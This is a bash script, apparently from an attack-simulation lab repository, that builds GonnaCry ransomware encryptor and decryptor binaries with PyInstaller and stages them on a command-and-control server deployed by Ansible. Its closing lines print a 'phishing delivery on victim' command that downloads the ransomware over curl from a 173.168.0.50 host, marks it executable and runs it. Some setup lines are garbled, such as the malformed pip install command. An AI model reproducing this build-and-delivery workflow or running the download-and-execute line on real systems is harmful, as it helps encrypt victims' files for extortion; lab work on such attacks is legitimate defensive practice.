#!/usr/bin/env bash
# Build GonnaCry payload binaries with PyInstaller.
#
# Run this on Ubuntu/Debian (same glibc as target client VMs).
# Do NOT run on Arch Linux — glibc mismatch will crash binaries on Ubuntu clients.
#
# Prerequisites:
#   pip3 install python3 -m PyInstaller pycryptodome requests
#
# After build, copy binaries to this repo and commit:
#   cp dist/gonnacry dist/decryptor <repo>/attacks/GonnaCry/src/Server/binaries/
#   git add attacks/GonnaCry/src/Server/binaries/
#   Then redeploy C2: ansible-playbook -i inventory/hosts.ini playbooks/configure_c2.yml -e "project_root=$(pwd)"

set -e
export PATH="$HOME/.local/bin:$PATH"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SRC_DIR="$SCRIPT_DIR/src/GonnaCry"
OUT_DIR="$SCRIPT_DIR/src/Server/binaries"
TMP_DIR="/tmp/python3 -m PyInstaller-build"

mkdir -p "$OUT_DIR"

cd "$SRC_DIR"

echo "=== Building encryptor (gonnacry) ==="
python3 -m PyInstaller --onefile \
    --distpath "$OUT_DIR" \
    --workpath "$TMP_DIR/work" \
    --specpath "$TMP_DIR" \
    --name gonnacry \
    main.py
echo "Built: $OUT_DIR/gonnacry"

echo ""
echo "=== Building decryptor ==="
python3 -m PyInstaller --onefile \
    --distpath "$OUT_DIR" \
    --workpath "$TMP_DIR/work" \
    --specpath "$TMP_DIR" \
    --name decryptor \
    decryptor.py
echo "Built: $OUT_DIR/decryptor"

echo ""
echo "=== Done ==="
ls -lh "$OUT_DIR/gonnacry" "$OUT_DIR/decryptor"
echo ""
echo "Next steps:"
echo "  1. Commit:    git add attacks/GonnaCry/src/Server/binaries/ && git commit"
echo "  2. Deploy C2: ansible-playbook -i inventory/hosts.ini playbooks/configure_c2.yml -e 'project_root=\$(pwd)'"
echo ""
echo "Phishing delivery on victim:"
echo "  curl -s http://173.168.0.50/download-gonnacry/ -o /tmp/gonnacry && chmod +x /tmp/gonnacry && /tmp/gonnacry"
